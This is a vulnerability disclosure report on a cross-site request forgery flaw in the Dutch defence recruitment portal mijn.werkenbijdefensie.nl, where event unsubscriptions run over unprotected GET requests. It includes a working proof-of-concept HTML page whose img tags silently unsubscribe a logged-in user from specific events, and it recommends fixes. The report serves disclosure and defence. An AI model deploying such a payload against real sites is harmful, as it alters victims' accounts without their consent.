Summary:

**Domain and URL:**
https://mijn.werkenbijdefensie.nl/activiteiten/bezocht

**Summary:** Possible to unsubscribe from activities/events using CSRF
**Description:** it is possible to unsubscribe a logged in user from any subscribed events. The unsubscribe is done by a GET-call which is (of course) not protected by an anti-forgery token. The ID of the event is given, which can be found for everyone on the events-overview page. It would be very easy to make an attack page including all events, unsubscribing all users.

## Browsers Verified In:
  * Chrome Version 56.0.2924.87 @ Windows 10

## Steps To Reproduce:

  1. User should be logged in to mijn.werkenbijdefensie.nl
  2. User should visit a page with the following HTML (for example, triggering the GET in any way is good enough):

```
<html>
<head>
<title>CSRF</title>
</head>
<body>

You're unsubscribed from activity # 301449 and # 301731
<img src="https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301449" />
<img src="https://mijn.werkenbijdefensie.nl/activiteiten/uitschrijven/301731" />

</body>
</html>
```
  3. User is unsubscribed from the specific activities

## Known steps to resolve:
Do not use the GET-method for any operation that changes something. Next, add an anti-forgery token as is present everywhere on the site.
